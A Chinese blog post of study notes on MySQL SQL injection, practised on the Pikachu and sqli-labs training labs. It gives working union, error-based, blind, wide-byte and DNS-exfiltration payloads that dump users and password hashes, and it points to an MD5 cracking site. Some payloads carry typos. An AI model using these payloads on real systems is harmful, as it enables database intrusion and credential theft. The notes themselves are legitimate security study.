---
title: WEB攻防--sql注入
date: 2024年8月25日
updated: 2024年8月25日
tags:
  - 渗透
categories: 渗透
keywords:
description: 守夜-sql注入

---


# sql注入

![](https://pic.imgdb.cn/item/66c84ed5d9c307b7e94615ae.png)


## 原理
脚本代码在实现代码和数据库进行通讯时，讲定义的sql语句进行执行，其中sql能够通过参数来传递自定义值来实现控制sql语句，从而执行恶意的sql语句

sql首要条件就是有参数，可控的参数，但不是说url没有参数就不能注入

但是如果是这样的

```
xxx.xxx.xxx.xxx/admin_login.asp?id=1
```
是可以注入的

如果有两个可变参数比如

```
xxx.xxx.xxx.xxx/admin_login.asp?id=1&page=1
```
判断id有注入的时候应该尝试
```
xxx.xxx.xxx.xxx/admin_login.asp?id=1 注入语句  & page=1
```

或者
```
xxx.xxx.xxx.xxx/admin_login.asp?page=1&id=1  注入语句
```

mysql中```# -- ```是注释符的意思
```
mysql> select id,email,username from member where username ="vince";
+----+-------------------+----------+
| id | email             | username |
+----+-------------------+----------+
|  1 | vince@pikachu.com | vince    |
+----+-------------------+----------+
1 row in set (0.00 sec)

mysql> select id,email,username from member -- where username ="vince";
    -> ;
+----+-------------------+----------+
| id | email             | username |
+----+-------------------+----------+
|  1 | vince@pikachu.com | vince    |
|  2 | allen@pikachu.com | allen    |
|  3 | kobe@pikachu.com  | kobe     |
|  4 | grady@pikachu.com | grady    |
|  5 | kevin@pikachu.com | kevin    |
|  6 | lucy@pikachu.com  | lucy     |
|  7 | lili@pikachu.com  | lili     |
+----+-------------------+----------+
```

为什么平常注入的时候要加'呢，因为一般都是类似
```
$name=$_GET['name'];
$query='select id ,email,username from member where username='[name]';
```
当你注入```xx' or 1=1 --+```这种的时候

会变成

```
$name=$_GET['name'];
$query='select id ,email,username from member where username='xx' or 1=1 --+';
```

在其中，'xx'提前闭合了，又因为or的原因导致1=1永真成立，使得sql语句成立


## 如何找注入点位置

还是那句话，找自定义变量的

类似?xx=xxx这种的，可以一试

有些交互的地方类似分页这种数据自动变化的，可能有limit的限制；
```
mysql> select id,username from member limit 0,2;
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    17
Current database: pikachu

+----+----------+
| id | username |
+----+----------+
|  1 | vince    |
|  2 | allen    |
+----+----------+
2 rows in set (0.01 sec)

mysql> select id,username from member limit 2,2;
+----+----------+
| id | username |
+----+----------+
|  3 | kobe     |
|  4 | grady    |
+----+----------+
2 rows in set (0.00 sec)

mysql> select id,username from member limit 4,2;
+----+----------+
| id | username |
+----+----------+
|  5 | kevin    |
|  6 | lucy     |
+----+----------+
2 rows in set (0.00 sec)

```

理论上，只要与后端数据库进行交互的地方，都可能存在sql注入，甚至cookie这里面都可以，不止只局限于url里面的?xx=xx

只要与后台有交互都可以(抓包)


## 联合注入
在网址中空格可以用+代替

union联合查询需要有同样的列数
```
mysql> select id,username from member union select username,password from users;
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    19
Current database: pikachu

+---------+----------------------------------+
| id      | username                         |
+---------+----------------------------------+
| 1       | vince                            |
| 2       | allen                            |
| 3       | kobe                             |
| 4       | grady                            |
| 5       | kevin                            |
| 6       | lucy                             |
| 7       | lili                             |
| admin   | e10adc3949ba59abbe56e057f20f883e |
| pikachu | 670b14728ad9902aecba32e22fa4f6bd |
| test    | e99a18c428cb38d5f260853678922e03 |
+---------+----------------------------------+
10 rows in set (0.01 sec)
```

所以就可以使用
```
' union select username,password from users#
```

出来的md5，你可以上cmd5进行解密
[cmd5](cmd5.com)

## 简单常用测试语句和注释符号

在GET请求中，不允许出现空格，所以我们需要用+代替，当然你也可以用url编码
POST中没有问题

```+```会自动识别为空格
或者url编码为```%20```


sql中常见的注释符号就是```#以及--（--后面必须加一个空格，这就是常见的--+的来源）```

在GET请求中，url部分也不能出现#


```常见测试语句
引号测试

加一个"或者'，看是否报错
原因也很简单
$query='select id ,email,username from member where username='[name]'中，你只输入'的话就成了
$query='select id ,email,username from member where username='''；
前面两个引号已经闭合了，最后多的这个就报错了


永真
or 1=1 后面的1=1永真，前面的语句也为真就
and 1=1 两个同时为真才真，查询结果和不加1=1一样，防护中有一种参数化查询，又名PDO预处理，参数化查询可能将'1 and 1=1 '整个当成name查询，正常输入'1 and 1=1'应该查询不到，但是如果查询到了说明可能没进行预处理，这时可以加一个永假，如果and 1=1查到了，and 1=2不行，说明存在

永假
and 1=2查询结果为假，啥都么的应该


union select 联合查询
```

## sqk注入分类

主要分为数字型，字符型，搜索型，xx型

### 数字型

数据库中是
```
$query='select id ,email,username from member where id=$id;
```
这种id=$id的，数据库中类型是int类型（如果是int unsigned的话后面的unsigned说明不可为负号）

### 字符型
```
$query='select id ,email,username from member where id="[name]";
```

### 搜索型

可以使用模糊匹配
```
mysql> select id,email from member where username like "vin";
+----+-------------------+
| id | email             |
+----+-------------------+
|  1 | vince@pikachu.com |
+----+-------------------+
1 row in set (0.00 sec)
```
=表示的是精确匹配，而对应的可以用like作为模糊匹配，%vin表示以vin结尾的。%表示的是通配符，
```对比一下
vin开头
mysql> select id,email from member where username like "vin%";
+----+-------------------+
| id | email             |
+----+-------------------+
|  1 | vince@pikachu.com |
+----+-------------------+
1 row in set (0.00 sec)


vin结尾
mysql> select id,email from member where username like "%vin";
+----+-------------------+
| id | email             |
+----+-------------------+
|  5 | kevin@pikachu.com |
+----+-------------------+
1 row in set (0.00 sec)


包含vin
mysql> select id,email from member where username like "%vin%";
+----+-------------------+
| id | email             |
+----+-------------------+
|  1 | vince@pikachu.com |
|  5 | kevin@pikachu.com |
+----+-------------------+
2 rows in set (0.00 sec)

```
也可以用上面的
```
xx' or 1=1#
```

进行闭合

### xx型

用一些特殊符号，像是()[]这种
```pikachu
$query='select id ,email,username from member where id=（"[name]"）；
```

注意要闭合括号

```
xx)' or 1=1 --+
```

### json类型

#### 判断

```
content-type:检查数据是什么格式，常用的有三个

1.application/x-www-form-urlencoded,浏览器传输的时候的默认类型值
urlencoded格式是  键值对  比如 id=1&username=2&passwd=3

2.application/json,
{["id":[（"id"：“xxx”）]]}这种,很明显的一大堆的json数据类型
{"name":"vernus","password":"123"}这个也是json类型

```
![](https://pic.imgdb.cn/item/66c9a281d9c307b7e921b5e4.png)

根据不同的application，服务端的接收也不同

多应用于前后端分离的项目，app，小程序，公众号

![](https://pic.imgdb.cn/item/66c9a46dd9c307b7e926e1ca.png)


#### json注入

跟正常的一样，但是键值对，键必须双引号，值字符串双引号，所以我们可以尝试用单引号注入

可以在页面最下面
```
json={搞一个json的}，参考
```

![](https://pic.imgdb.cn/item/66c9a619d9c307b7e9287dbb.png)

![](https://pic.imgdb.cn/item/66c9a6a3d9c307b7e9290244.png)

### 按提交方式分类

![](https://pic.imgdb.cn/item/66c9a8c3d9c307b7e92b03ac.png)

GET改urlencode的，POST改下面请求体的，cookie直接尝试就行


### 按请求位置分类

![](https://pic.imgdb.cn/item/66c9aa3ed9c307b7e92c6c12.png)

ua里面注入的话，可以考虑一下报错注入

### mysql变量和 函数

```
version                                 查看版本
version_compile_os                      查看当前操作系统

```
使用的时候执行下面的即可
```
select @@语句
```

mysql内置函数，
```
mysql> select database();
+------------+
| database() |
+------------+
| NULL       |
+------------+
1 row in set (0.00 sec)

mysql> select version();
+-----------+
| version() |
+-----------+
| 8.0.12    |
+-----------+
1 row in set (0.00 sec)

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```

## 报错注入
适用于页面上没有任何反馈信息的

常用的报错函数
```
Updatexml():函数是mysql对xml文档数据进行查询和修改的xpath函数
extractvalue()：函数是mysqlxml文档进行查询的xpath函数
floor():mysql中用于取整的函数
```
#### updatexml
内容替换的

updatexml（xml_document,xpath_string,new_value）

![](https://pic.imgdb.cn/item/66ca8675d9c307b7e94d495d.png)


mysql的xpath

![](https://pic.imgdb.cn/item/66ca87a8d9c307b7e94e3ec3.png)

中间的'//'是xpath，如上图判断的是/root/message/content里面的msg替换成
I an fine,thank you


concat拼接，
```
mysql> select concat('hello','world');
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    10
Current database: *** NONE ***

+-------------------------+
| concat('hello','world') |
+-------------------------+
| helloworld              |
+-------------------------+
1 row in set (0.01 sec)
```

```
mysql> select updatexml('hello',concat('>>',(select version()),"<<"),"world");
ERROR 1105 (HY000): XPATH syntax error: '>>8.0.12<<'
mysql>
```
先在```select version()```外面加一层()使得其先执行

#### extractvalue()

![](https://pic.imgdb.cn/item/66ca8a61d9c307b7e9509f3c.png)

```
mysql> select ExtractValue('<a><b>hello</b></a>','/a/b');
+--------------------------------------------+
| ExtractValue('<a><b>hello</b></a>','/a/b') |
+--------------------------------------------+
| hello                                      |
+--------------------------------------------+
1 row in set (0.00 sec)
```

也可以结合着来
```
mysql> select ExtractValue('<a><b>hello</b></a>',concat(">>",(select @@version)));
ERROR 1105 (HY000): XPATH syntax error: '>>8.0.12'
```

#### 相关语句
```
爆版本
1' and updatexml(1,concat(ox7e,(select version()),0x7e),1)#

爆当前用户
1' and updatexml(1,concat(ox7e,(select user()),0x7e),1)#

爆当前数据库
1' and updatexml(1,concat(ox7e,(select dastabase()),0x7e),1)#

爆表
mysql5.1以上版本会有一个叫information_schema的默认数据库，这个库记录着整个mysql管理的数据库的名称，表明，库名，列名
所以我们可以通过他获取表明，以皮卡丘为例

1' and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema='pakachu')),1)#,

但是反馈回的错误数据只能显示一行，所以我们要加limit限制

1' and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema='pakachu' limit 0,1)),1)#,

更改limit后面的0实现遍历

爆字段
1' and updatexml(1,concat(0x7e,(select password from information_schema.columns where table_name="users" and table_schema="pikachu" limit 0,1)),0)#

爆字段内容
1' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#

```

## 增删改查注入

简单来说就是不只有select可以注入,insert,update,delete啥的都行


## 宽字节注入
有些php网站，为了防止sql注入，经常才用引号转义的方式，比如打开全局GPC配置
![](https://pic.imgdb.cn/item/66ca943fd9c307b7e95feefc.png)

比如
```
xx' or 1=1#

经过转义就成了

xx\' or 1=1#
```
引号天然丢失
所以呢，我们可以在前面加%df这样，%5c是\，%df是中但是连起来的%df%5C就是一个运（应该是个繁体的）字，这样就避开了转义，宽字节就是将\变成汉字吃掉

## 偏移量注入
union的前提是查询的两个里面有相同列的

```
mysql> select * from users union select username,email from member;
ERROR 1222 (21000): The used SELECT statements have a different number of column
```

所以我们可以进行偏移，前面补上1，2，3，4，这种
```
mysql> select * from users union select 1,2,username,email from member;
+----+----------+----------------------------------+-------------------+
| id | username | password                         | level             |
+----+----------+----------------------------------+-------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
|  1 | 2        | vince                            | vince@pikachu.com |
|  1 | 2        | allen                            | allen@pikachu.com |
|  1 | 2        | kobe                             | kobe@pikachu.com  |
|  1 | 2        | grady                            | grady@pikachu.com |
|  1 | 2        | kevin                            | kevin@pikachu.com |
|  1 | 2        | lucy                             | lucy@pikachu.com  |
|  1 | 2        | lili                             | lili@pikachu.com  |
+----+----------+----------------------------------+-------------------+
10 rows in set (0.00 sec)

```

知道表明，不知道列名的时候用偏移量注入，联合查询前面查询语句列数要和诸如后面的union列数要多

感觉讲的有点懵懵的，我的理解就是，你正常的union联合查询需要前后的列数一样，所以为了一致我们要加1，2，3，4，5，6...这种来填补，但是我们在输出的时候，查询的，额，比如

```
mysql> select * from users union select 1,2,username,email from member;
+----+----------+----------------------------------+-------------------+
| id | username | password                         | level             |
+----+----------+----------------------------------+-------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
|  1 | 2        | vince                            | vince@pikachu.com |
|  1 | 2        | allen                            | allen@pikachu.com |
|  1 | 2        | kobe                             | kobe@pikachu.com  |
|  1 | 2        | grady                            | grady@pikachu.com |
|  1 | 2        | kevin                            | kevin@pikachu.com |
|  1 | 2        | lucy                             | lucy@pikachu.com  |
|  1 | 2        | lili                             | lili@pikachu.com  |
+----+----------+----------------------------------+-------------------+
```
这种，username是第二列，我们就不能直接用```1,2,3,users.*```来进行，不然下面的就被掩盖了，上面那个就是被掩盖的，正确的是这个
```
+----+----------+----------------------------------+-------------------+
| id | username | password                         | level             |
+----+----------+----------------------------------+-------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
|  1 | vince    | 2                                | vince@pikachu.com |
|  1 | allen    | 2                                | allen@pikachu.com |
|  1 | kobe     | 2                                | kobe@pikachu.com  |
|  1 | grady    | 2                                | grady@pikachu.com |
|  1 | kevin    | 2                                | kevin@pikachu.com |
|  1 | lucy     | 2                                | lucy@pikachu.com  |
|  1 | lili     | 2                                | lili@pikachu.com  |
+----+----------+----------------------------------+-------------------+
```

## 加密注入

前端给后端注入有时候是加密的，所以有时候要进行加密的注入

加密算法可能在某个js代码中，min的是经过压缩，额，好像不叫这个，就是加了一定的混淆的，详细的请玩js逆向


## 堆叠注入

就是一堆sql语句执行

![](https://pic.imgdb.cn/item/66cadc43d9c307b7e9bab1f3.png)

前面通过;已经结束了，后面的语句可以任意写

### 限制

堆叠注入是否能成，取决于后端代码，
例如

![](https://pic.imgdb.cn/item/66cadd29d9c307b7e9bb70a2.png)

## 二次注入

第一次注入，第二次触发

举个例子，在注册框注册一个admin'# 的，他不会被转义，二十存储在数据库中，但是当你修改密码的时候，他后面的'#会被转义，这时候你修改的admin'#就变成了修改admin的密码了

sqli-labs-24


## 中转注入（不好弄）

就是你截取一个数据包，然后发到中转的，再从中转转发到url

![](https://pic.imgdb.cn/item/66cae012d9c307b7e9bdf455.png)

这是一个php进行base64加密的

## 伪静态注入

![](https://pic.imgdb.cn/item/66cae16fd9c307b7e9bf2038.png)

这种就在伪静态后加，比如/1/就在/1 后面加```' or 1=1#```

就是嗯加

## 回显和无回显
主要就是盲注

![](https://pic.imgdb.cn/item/66caeed6d9c307b7e9d23598.png)

上面这个，无回显，但是他做了一个判断，上面的做了一个查询条数的判断，结果不为1就输出不存在

但是为什么报错注入也没有呢，因为mysqli_query，默认不打印报错信息

或者在ini中对error设置成了off


## 布尔盲注
通过比较手段得到一个真假值，根据真假值断定数据是什么的
```
mysql> select username,email from member where username="vince" and length(database())=8;
Empty set (0.00 sec)

mysql> select username,email from member where username="vince" and length(database())=7;
+----------+-------------------+
| username | email             |
+----------+-------------------+
| vince    | vince@pikachu.com |
+----------+-------------------+
1 row in set (0.00 sec)
```

当然，皮卡丘中的也可以这么做

```
vince" and ascii(substr(database(),1,1))=112#
```

其中第一个1是length，但是盲注我们一般都直接上sqlmap跑




## 时间盲注

就是看延迟,sleep(5)--+
但是光延迟没啥用，我们可以拼接一下

```
mysql> select if(1>2,'a','b');
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    15
Current database: pikachu

+-----------------+
| if(1>2,'a','b') |
+-----------------+
| b               |
+-----------------+
1 row in set (0.01 sec)
```
mysql中存在着一个if判断语句，上面的意思为如果1>2，输出a，反之输出b

我们就可以进一步利用，比如

```
mysql> select if(substr(database(),1,1)="p",sleep(5),"2");
+---------------------------------------------+
| if(substr(database(),1,1)="p",sleep(5),"2") |
+---------------------------------------------+
| 0                                           |
+---------------------------------------------+
1 row in set (5.01 sec)
```
这里是判断数据库第一个名字是不是p，是的话延迟5秒，否则输出2

此外出了sleep还有一个benchmark也可以进行时间盲注

benchmark（100000.md5(1)）是将md5(1)执行100000次以达到延迟的效果
```
mysql> select benchmark(1000000,md5(123));
+-----------------------------+
| benchmark(1000000,md5(123)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.10 sec)

mysql> select benchmark(10000000,md5(123));
+------------------------------+
| benchmark(10000000,md5(123)) |
+------------------------------+
|                            0 |
+------------------------------+
1 row in set (0.94 sec)
```

可以看到肉眼可见的时间增加，就是不知道为啥人家1000000次是2.34s我是0.94，🤔

## dnslog注入

在网站的下级域名的时候随便加，比如

```
or load_file("http://database().www.xxx.com")
```
在开放日志记录的网站就记录下来了

网站

我实验的时候都没成功登上去过，奇了怪了[dnslog](www.dnslog.com),另外一个是
   [ceye](http://ceye.io/records/http)  ，这个倒是登上去了，就是卡的一批奥
之前好像写过一次dns外带的，我就不详细了，下面这个师傅一看就是看jadon老师的，

https://blog.csdn.net/qq_56607768/article/details/124224966

## 前端代码绕过
这玩意等我后面看到js加解密和js逆向再说

## 后端代码绕过

这个就是那些，额，和文件上传差不多，大小写，双写，宽字节，


![](https://pic.imgdb.cn/item/66caf5ffd9c307b7e9df706c.png)

## 总结

至此,mysql的sql注入应该是都么的了，后面还剩下木马,防护手段,getshell以及其他数据库的注入，那些明儿在说，懒了懒了